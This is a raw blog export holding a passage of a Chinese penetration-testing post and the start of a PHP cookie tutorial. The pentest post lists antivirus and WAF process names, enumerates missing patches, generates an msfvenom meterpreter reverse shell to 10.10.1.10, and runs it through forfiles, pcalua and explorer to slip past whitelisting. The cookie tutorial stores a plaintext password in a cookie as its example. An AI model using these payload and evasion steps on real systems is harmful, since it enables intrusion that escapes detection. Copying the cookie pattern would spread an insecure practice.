class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; tasklist</span><br><span class="line">Image Name                     PID Session Name        Session<span class="comment">#    Mem Usage</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">System Idle Process              <span class="number">0</span>                            <span class="number">0</span>         <span class="number">24</span> K</span><br><span class="line">System                           <span class="number">4</span>                            <span class="number">0</span>         <span class="number">52</span> K</span><br><span class="line">smss.exe                       <span class="number">312</span>                            <span class="number">0</span>        <span class="number">632</span> K</span><br><span class="line">csrss.exe                      <span class="number">396</span>                            <span class="number">0</span>      <span class="number">2</span>,<span class="number">736</span> K</span><br><span class="line">wininit.exe                    <span class="number">448</span>                            <span class="number">0</span>        <span class="number">764</span> K</span><br><span class="line">csrss.exe                      <span class="number">456</span>                            <span class="number">1</span>        <span class="number">336</span> K</span><br><span class="line">winlogon.exe                   <span class="number">488</span>                            <span class="number">1</span>      <span class="number">1</span>,<span class="number">048</span> K</span><br><span class="line">services.exe                   <span class="number">544</span>                            <span class="number">0</span>      <span class="number">8</span>,<span class="number">416</span> K</span><br><span class="line">lsass.exe                      <span class="number">552</span>                            <span class="number">0</span>     <span class="number">17</span>,<span class="number">500</span> K</span><br><span class="line">lsm.exe                        <span class="number">560</span>                            <span class="number">0</span>      <span class="number">4</span>,<span class="number">108</span> K</span><br><span class="line">svchost.exe                    <span class="number">664</span>                            <span class="number">0</span>     <span class="number">14</span>,<span class="number">340</span> K</span><br><span class="line">svchost.exe                    <span class="number">740</span>                            <span class="number">0</span>      <span class="number">7</span>,<span class="number">808</span> K</span><br><span class="line">MsMpEng.exe                    <span class="number">808</span>                            <span class="number">0</span>    <span class="number">186</span>,<span class="number">060</span> K</span><br><span class="line">LogonUI.exe                    <span class="number">828</span>                            <span class="number">1</span>      <span class="number">1</span>,<span class="number">224</span> K</span><br><span class="line">svchost.exe                    <span class="number">928</span>                            <span class="number">0</span>     <span class="number">64</span>,<span class="number">288</span> K</span><br></pre></td></tr></table></figure><h4 id="查看已启动的程序信息"><a href="#查看已启动的程序信息" class="headerlink" title="查看已启动的程序信息"></a>查看已启动的程序信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">D:\S_JCIN\WebSite\OutWeb\L_CT\News&gt; wmic startup get command,caption</span><br><span class="line">Caption             Command                                                                                        </span><br><span class="line">ctfmon.exe          C:\WINDOWS\system32\CTFMON.EXE                                                                 </span><br><span class="line">ctfmon.exe          C:\WINDOWS\system32\CTFMON.EXE                                                                 </span><br><span class="line">ctfmon.exe          C:\WINDOWS\system32\CTFMON.EXE                                                                 </span><br><span class="line">desktop             desktop.ini                                                                                    </span><br><span class="line">Windows Search      C:\PROGRA~1\WINDOW~4\WINDOW~1.EXE  &#x2F;startup                                                    </span><br><span class="line">IMJPMIG8.1          &quot;C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE&quot; &#x2F;Spoil &#x2F;RemAdvDef &#x2F;Migration32                            </span><br><span class="line">IMEKRMIG6.1         C:\WINDOWS\ime\imkr6_1\IMEKRMIG.EXE                                                            </span><br><span class="line">CJIMETIPSYNC        C:\Program Files\Common Files\Microsoft Shared\IME\IMTC65\CHANGJIE\CINTLCFG.EXE &#x2F;CJIMETIPSync  </span><br><span class="line">PHIMETIPSYNC        C:\Program Files\Common Files\Microsoft Shared\IME\IMTC65\PHONETIC\TINTLCFG.EXE &#x2F;PHIMETIPSync  </span><br><span class="line">MsmqIntCert         regsvr32 &#x2F;s mqrt.dll                                                                           </span><br><span class="line">Adobe ARM           &quot;C:\Program Files\Common Files\Adobe\ARM\1.0\AdobeARM.exe&quot;                                     </span><br><span class="line">SunJavaUpdateSched  &quot;C:\Program Files\Common Files\Java\Java Update\jusched.exe&quot; </span><br></pre></td></tr></table></figure><h4 id="查看系统体系架构"><a href="#查看系统体系架构" class="headerlink" title="查看系统体系架构"></a>查看系统体系架构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><h4 id="常见软件杀毒进程"><a href="#常见软件杀毒进程" class="headerlink" title="常见软件杀毒进程"></a>常见软件杀毒进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;360tray.exe&quot;,    &quot;360安全卫士&quot;&#125;,</span><br><span class="line">&#123;&quot;360sd.exe&quot;,      &quot;360杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;a2guard.exe&quot;,    &quot;a-squared杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;ad-watch.exe&quot;,    &quot;Lavasoft杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;cleaner8.exe&quot;,    &quot;The Cleaner杀毒&quot;&#125;,</span><br><span class="line">&#123;&quot;vba32lder.exe&quot;,    &quot;vb32杀毒&quot;&#125;,</span><br><span class="line">火绒</span><br><span class="line">hipstray.exe</span><br><span class="line">wsctrl.exe</span><br><span class="line">usysdiag.exe</span><br></pre></td></tr></table></figure><h4 id="常见WAF进程"><a href="#常见WAF进程" class="headerlink" title="常见WAF进程"></a>常见WAF进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安全狗</span><br><span class="line">SafeDogGuardCenter.exe</span><br><span class="line">safedogupdatecenter.exe</span><br><span class="line">safedogguardcenter.exe</span><br><span class="line">SafeDogSiteIIS.exe</span><br><span class="line">SafeDogTray.exe</span><br><span class="line">SafeDogServerUI.exe</span><br><span class="line">D盾</span><br><span class="line">D_Safe_Manage.exe</span><br><span class="line">d_manage.exe</span><br><span class="line">云锁</span><br><span class="line">yunsuo_agent_service.exe</span><br><span class="line">yunsuo_agent_daemon.exe</span><br></pre></td></tr></table></figure><h4 id="补丁安装情况与漏洞信息收集"><a href="#补丁安装情况与漏洞信息收集" class="headerlink" title="补丁安装情况与漏洞信息收集"></a>补丁安装情况与漏洞信息收集</h4><h5 id="Windows-Exploit-Suggester"><a href="#Windows-Exploit-Suggester" class="headerlink" title="Windows-Exploit-Suggester"></a>Windows-Exploit-Suggester</h5><p>该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。</p><p>自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  Windows-Exploit-Suggester-master .&#x2F;windows-exploit-suggester.py --update</span><br><span class="line">[*] initiating winsploit version 3.3...</span><br><span class="line">[+] writing to file 2020-11-17-mssb.xls</span><br><span class="line">[*] done</span><br></pre></td></tr></table></figure><p>补丁信息收集</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">➜  Windows-Exploit-Suggester-master python windows-exploit-suggester.py  --database <span class="number">2020</span><span class="number">-11</span><span class="number">-17</span>-mssb.xls --systeminfo <span class="number">1.</span>txt</span><br><span class="line">[*] initiating winsploit version <span class="number">3.3</span>...</span><br><span class="line">[*] database file detected <span class="keyword">as</span> xls <span class="keyword">or</span> xlsx based on extension</span><br><span class="line">[*] attempting to read <span class="keyword">from</span> the systeminfo input file</span><br><span class="line">[+] systeminfo input file read successfully (utf<span class="number">-8</span>)</span><br><span class="line">[*] querying database file <span class="keyword">for</span> potential vulnerabilities</span><br><span class="line">[*] comparing the <span class="number">0</span> hotfix(es) against the <span class="number">356</span> potential bulletins(s) with a database of <span class="number">137</span> known exploits</span><br><span class="line">[*] there are now <span class="number">356</span> remaining vulns</span><br><span class="line">[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin</span><br><span class="line">[+] windows version identified <span class="keyword">as</span> <span class="string">&#x27;Windows 2003 SP2 32-bit&#x27;</span></span><br><span class="line">[*]</span><br><span class="line">[M] MS15<span class="number">-051</span>: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (<span class="number">3057191</span>) - Important</span><br><span class="line">[*]   https:<span class="comment">//github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC</span></span><br><span class="line">[*]   https:<span class="comment">//www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF</span></span><br></pre></td></tr></table></figure><p>可以看到目标系统为<code>Windows 2003 SP2 32-bit</code>，对应的漏洞信息会显示在下面。</p><h5 id="cmd查询补丁信息"><a href="#cmd查询补丁信息" class="headerlink" title="cmd查询补丁信息"></a>cmd查询补丁信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo&gt;saul.txt&amp;(for %i in ( KB4013389 KB3199135 KB3186973 KB3178466 KB3164038 KB3143145 KB3143141 KB3136041 K3134228 KB3089656 KB3067505 KB3077657 KB3057839 KB3057191 KB3031432 KB3036220 KB3023266 KB2989935 KB3011780 KB3000061 KB2992611 KB2975684 KB2914368 KB2850851 KB2840221 KB2778930 KB2972621 KB2671387 KB2592799 KB2566454 KB2503665 KB2393802 KB2305420 KB2267960 KB982799 KB2160329 KB977165 KB971468 KB975517 KB970483 KB959454 KB957097 KB958644 KB956803 KB941693 KB921883 KB899588 KB823980 ) do @type saul.txt|@find &#x2F;i &quot;%i&quot;|| @echo %i is Yes)&amp;del &#x2F;f &#x2F;q &#x2F;a saul.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">KB4013389 is Yes  </span><br><span class="line">KB3199135 is Yes  </span><br><span class="line">KB3186973 is Yes  </span><br><span class="line">KB3178466 is Yes  </span><br><span class="line">KB3164038 is Yes  </span><br><span class="line">KB3143145 is Yes  </span><br><span class="line">KB3143141 is Yes  </span><br><span class="line">KB3136041 is Yes  </span><br><span class="line">K3134228 is Yes  </span><br><span class="line">KB3089656 is Yes  </span><br><span class="line">KB3067505 is Yes  </span><br><span class="line">KB3077657 is Yes  </span><br><span class="line">KB3057839 is Yes  </span><br><span class="line">KB3057191 is Yes  </span><br><span class="line">KB3031432 is Yes  </span><br><span class="line">KB3036220 is Yes  </span><br><span class="line">KB3023266 is Yes</span><br></pre></td></tr></table></figure><h5 id="2003服务器查看补丁"><a href="#2003服务器查看补丁" class="headerlink" title="2003服务器查看补丁"></a>2003服务器查看补丁</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe list full</span><br></pre></td></tr></table></figure><h4 id="提权信息收集脚本"><a href="#提权信息收集脚本" class="headerlink" title="提权信息收集脚本"></a>提权信息收集脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinEnum.bat</span><br></pre></td></tr></table></figure><p>使用之后会在当前目录下生成report.txt文件。</p><h2 id="免杀技巧-执行系统命令方式"><a href="#免杀技巧-执行系统命令方式" class="headerlink" title="免杀技巧-执行系统命令方式"></a>免杀技巧-执行系统命令方式</h2><p>在渗透测试中，拿到shell之后发现无法调用cmd.exe，可以上传一个自己的cmd.exe。但是有些电脑含有杀毒软件，将监视二进制文件，所以我们需要绕过检测。</p><p>Windows系统提供了多个二进制文件，可以使用它们执行任意命令。</p><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>未正确配置白名单规则（这里涵盖了文件名和路径），使得一些系统可执行文件能够执行。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.1.10 lport&#x3D;8888 -f exe -o hacker.exe</span><br></pre></td></tr></table></figure><p>攻击机监听</p><h4 id="免杀绕过"><a href="#免杀绕过" class="headerlink" title="免杀绕过"></a>免杀绕过</h4><h5 id="Forfiles"><a href="#Forfiles" class="headerlink" title="Forfiles"></a>Forfiles</h5><h6 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h6><p>forfiles是Windows Server 2003内置的命令行文件，forfiles是一款windows平台的软件工具，其中选择文件并运行一个命令来操作文件，其它系统未必适用。不过，win2003以上的系统，包括win7、windows server 2008均适用。forfiles 是一个命令实用程序，可以选择多个文件并在它们上运行命令，它通常用于批处理作业中，但可能会被滥用以执行任意命令或可执行文件。</p><h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles [&#x2F;p Path ] [&#x2F;m SearchMask ] [&#x2F;s ] [&#x2F;c Command ] [&#x2F;d [&#123;+ | - &#125;] [&#123;MM &#x2F; DD &#x2F; YYYY | DD &#125;]]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;p Path</span><br></pre></td></tr></table></figure><p>指定Path ，表明要从哪里开始搜索。默认的文件夹是当前工作目录，该目录通过键入句号(.) 指定。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;m SearchMask</span><br></pre></td></tr></table></figure><p>按照SearchMask 搜索文件。默认的SearchMask 是*.* 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;s</span><br></pre></td></tr></table></figure><p>指示forfiles 在子目录中搜索。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;c Command</span><br></pre></td></tr></table></figure><p>在每个文件上运行指定的Command 。带有空格的命令字符串必须用引号括起来。默认的Command 是”cmd /c echo @file” 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;d [&#123;+ | - &#125;] [&#123;MM &#x2F; DD &#x2F; YYYY | DD &#125;]</span><br></pre></td></tr></table></figure><p>选择日期大于或等于(+ )（或者小于或等于(- )）指定日期的文件，其中MM / DD / YYYY 是指定的日期，DD 是当前日期减去DD 天。如果未指定+ 或- ，则使用+ 。DD 的有效范围是0 - 32768。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?</span><br></pre></td></tr></table></figure><p>在命令提示符下显示帮助。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles -p &quot;D:\testFolder&quot; -s -m &quot;*.csv&quot; -d -100 -c &quot;cmd &#x2F;c del @FILE&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-p指定了搜索的根目录为&quot;D:\testFolder&quot;</span><br><span class="line">递归的搜索(-s)</span><br><span class="line">搜索到的文件名的匹配模式是&quot;*.csv&quot;</span><br><span class="line">文件的日期(创建日期？修改日期？)是100天之前的文件</span><br><span class="line">对于所有得到的文件，都执行一个命令为&quot;cmd &#x2F;c del @FILE&quot;，表示要删除这个文件。</span><br></pre></td></tr></table></figure><h6 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forfiles &#x2F;p c:\windows\system32 &#x2F;m calc.exe &#x2F;c C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-p指定搜索的根目录</span><br><span class="line">&#x2F;m 指定搜索的文件名字</span><br><span class="line">-c执行的命令--这里就是执行我们的木马文件。</span><br></pre></td></tr></table></figure><p>hacker.exe 将是forfiles.exe子进程。</p><h5 id="Pcalua"><a href="#Pcalua" class="headerlink" title="Pcalua"></a>Pcalua</h5><h6 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h6><p>Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。当它检测到存在兼容性问题的软件时就会运行。该实用程序位于” C：\ Windows \ System32 “中，并且可以使用” -a”参数执行命令。</p><h6 id="应用-1"><a href="#应用-1" class="headerlink" title="应用"></a>应用</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcalua.exe -a C:\tmp\hacker.exe</span><br></pre></td></tr></table></figure><p>hacker.exe将是一个新的父进程。</p><h5 id="Explorer"><a href="#Explorer" class="headerlink" title="Explorer"></a>Explorer</h5><h6 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h6><p>可以将explorer.exe 用作执行方法。执行的有效负载将在系统上创建一个进程，该进程将把explorer.exe作为父进程。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">explorer.exe C:\tmp\hacker.exe explorer.exe &#x2F;root,&quot;C:\tmp\hacker.exe&quot;explorer.exe 0XAXSDD-Hacker, &quot;C:\tmp\hacker.exe&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发学习--核心编程4</title>
      <link href="2019/12/10/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B3/"/>
      <url>2019/12/10/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B3/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP核心编程3"><a href="#PHP核心编程3" class="headerlink" title="PHP核心编程3"></a>PHP核心编程3</h1><h2 id="PHP与cookie"><a href="#PHP与cookie" class="headerlink" title="PHP与cookie"></a>PHP与cookie</h2><h3 id="什么是cookie？"><a href="#什么是cookie？" class="headerlink" title="什么是cookie？"></a>什么是cookie？</h3><p>简单来说，Cookies就是服务器暂时存放在你的电脑里的资料（.txt格式的文本文件），好让服务器用来辨认你的计算机（通常经过加密）；</p><p>Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，<code>下次请求同一网站时就发送该Cookie给服务器</code></p><p>Cookie名称和值可以由服务器端开发者定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等，服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</p><p> 注意：每种浏览器都可以存储COOKIE数据；各个浏览器之间的COOKIE数据不能共享。</p><h3 id="cookie实操"><a href="#cookie实操" class="headerlink" title="cookie实操"></a>cookie实操</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//添加COOKIE数据</span></span><br><span class="line">setcookie(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;admin&quot;</span>,time()+<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;123456&quot;</span>,time()+<span class="number">7</span>*<span class="number">24</span>*<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h4 id="第一次访问"><a href="#第一次访问" class="headerlink" title="第一次访问"></a>第一次访问</h4><h5 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h5><p>第一次访问，本地并没有服务端设置发送的cookie，所以请求并不会带上cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;php&#x2F;setcookie.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.193 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br></pre></td></tr></table></figure><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><p>第一次响应，服务端设置cookie并把cookie发送给客户端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sat, 14 Nov 2020 03:11:10 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP&#x2F;5.6.40</span><br><span class="line">Set-Cookie: username&#x3D;admin; expires&#x3D;Sat, 21-Nov-2020 03:11:10 GMT; Max-Age&#x3D;604800</span><br><span class="line">Set-Cookie: password&#x3D;123456; expires&#x3D;Sat, 21-Nov-2020 03:11:10 GMT; Max-Age&#x3D;604800</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br></pre></td></tr></table></figure><h4 id="第二次访问"><a href="#第二次访问" class="headerlink" title="第二次访问"></a>第二次访问</h4><h5 id="请求-1"><a href="#请求-1" class="headerlink" title="请求"></a>请求</h5><p>第一次拿到了cookie，可以看到第二次访问服务端带上了cookie。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;php&#x2F;setcookie.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.193 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: username&#x3D;admin; password&#x3D;123456</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br></pre></td></tr></table></figure><h5 id="响应-1"><a href="#响应-1" class="headerlink" title="响应"></a>响应</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Sat, 14 Nov 2020 03:14:34 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">X-Powered-By: PHP&#x2F;5.6.40</span><br><span class="line">Set-Cookie: username&#x3D;admin; expires&#x3D;Sat, 21-Nov-2020 03:14:34 GMT; Max-Age&#x3D;604800</span><br><span class="line">Set-Cookie: password&#x3D;123456; expires&#x3D;Sat, 21-Nov-2020 03:14:34 GMT; Max-Age&#x3D;604800</span><br><span class="line">Content-Length: 0</span><br><span class="line">Keep-Alive: timeout&#x3D;5, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br></pre></td></tr></table></figure><h3 id="COOKIE设置"><a href="#COOKIE设置" class="headerlink" title="COOKIE设置"></a>COOKIE设置</h3><h4 id="COOKIE过期有效性设置"><a href="#COOKIE过期有效性设置" class="headerlink" title="COOKIE过期有效性设置"></a>COOKIE过期有效性设置</h4><h5 id="即时性COOKIE设置"><a href="#即时性COOKIE设置" class="headerlink" title="即时性COOKIE设置"></a>即时性COOKIE设置</h5><p>描述：默认cookie的有效期是关闭浏览器时，自动失效。该cookie称为临时cookie；</p><p>语法：<code>bool setcookie ( string $name , string $value [, int $expire = 0 ])</code></p><p>参数：$expire可选，指定cookie保存的时间，默认为0，关闭浏览器失效；</p><h5 id="有效性COOKIE设置"><a href="#有效性COOKIE设置" class="headerlink" title="有效性COOKIE设置"></a>有效性COOKIE设置</h5><p>语法： <code>bool setcookie ( string $name , string $value [, int $expire = 0 ])</code></p><p>参数：$expire可选，指定cookie保存的时间，默认为0，关闭浏览器失效；</p><p>说明：$expire为一个时间戳。一般用<code>time()+N</code>表示新的时间戳。在当前时间点，再加上N秒后，产生一个新的时间戳。</p><p>提示：一旦指定了有效的过期时间，cookie失效跟关闭浏览器无关(持久cookie)。</p><h4 id="COOKIE路径有效性"><a href="#COOKIE路径有效性" class="headerlink" title="COOKIE路径有效性"></a>COOKIE路径有效性</h4><p>描述：设置COOKIE只能在指定的目录及其子目录下有效</p><p>语法：<code>bool setcookie ( string $name [, string $value [, int $expire = 0 [, string $path]]] )</code></p><p>参数：<code>$path默认为&quot;/&quot;</code>，代表当前网站根目录，在当前目录及其所有子目录都可以使用。</p><p>ü 